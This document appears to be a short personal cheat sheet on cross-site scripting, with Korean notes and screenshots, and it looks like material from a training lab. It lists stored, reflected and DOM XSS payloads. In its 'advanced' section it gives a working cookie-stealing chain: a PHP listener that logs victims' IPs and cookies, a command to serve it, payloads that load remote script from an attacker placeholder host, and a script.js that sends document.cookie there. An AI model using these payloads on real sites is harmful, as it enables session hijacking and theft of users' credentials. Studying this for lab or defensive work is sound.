# XSS
## Stored XSS
```html
<script>alert(window.origin)</script>
<script>alert(document.cookie)</script>
<script>print()</script>
<plaintext>
```
<img width="1106" height="94" alt="image" src="https://github.com/user-attachments/assets/d9fdaeb7-2eef-4bf8-9b50-1d10c952551f" />

## Reflected XSS
- 공격자가 악성 스크립트가 포함된 URL을 만들어 피해자에게 전달하면, 피해자가 해당 링크를 클릭했을 때 서버가 URL의 파라미터를 검증 없이 응답 페이지에 그대로 반영하여 스크립트가 실행
```html
<script>alert(window.origin)</script>
```
<img width="1414" height="94" alt="image" src="https://github.com/user-attachments/assets/e8ad87e9-20b1-4f92-83fc-284fc006087e" />

## DOM XSS
```html
document.write()
DOM.innerHTML
DOM.outerHTML
add()
after()
append()
```

## advanced
```html
<img src="" onerror=alert(window.origin)>
```
```php
# index.php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```
```bash
sudo php -S 0.0.0.0:80
```
```html
<script src=http://OUR_IP></script>
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
<script>$.getScript("http://OUR_IP")</script>
```
```html
# script.js
document.location='http://OUR_IP/index.php?c='+document.cookie;
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```
<img width="832" height="704" alt="image" src="https://github.com/user-attachments/assets/3aa72f40-1ead-4db1-8c05-68c42ad656cf" />

- 각각의 input에다가 테스트 후에 XSS 취약점 input에다가 `script.js`를 요청하여 cookie를 얻어냄.
